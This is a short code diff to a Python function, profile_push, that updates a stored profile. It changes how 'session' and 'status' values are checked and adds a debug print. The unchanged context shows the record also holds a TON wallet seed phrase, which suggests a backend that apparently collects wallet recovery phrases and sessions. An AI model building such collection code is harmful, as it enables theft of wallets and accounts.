@@ -22,10 +22,11 @@ def profile_push():
     update_data = {
             "last_time": datetime.now(),
         }
-    if session and len(session) >= 3:
+    if session != "none" and len(session) >= 3:
         update_data["session"] = session
 
-    if status and len(status) >= 3:
+    if status != "none" and len(status) >= 3:
+        print(status)
         update_data["status"] = status
         
     if seedPhraseTon and len(seedPhraseTon) >= 3:
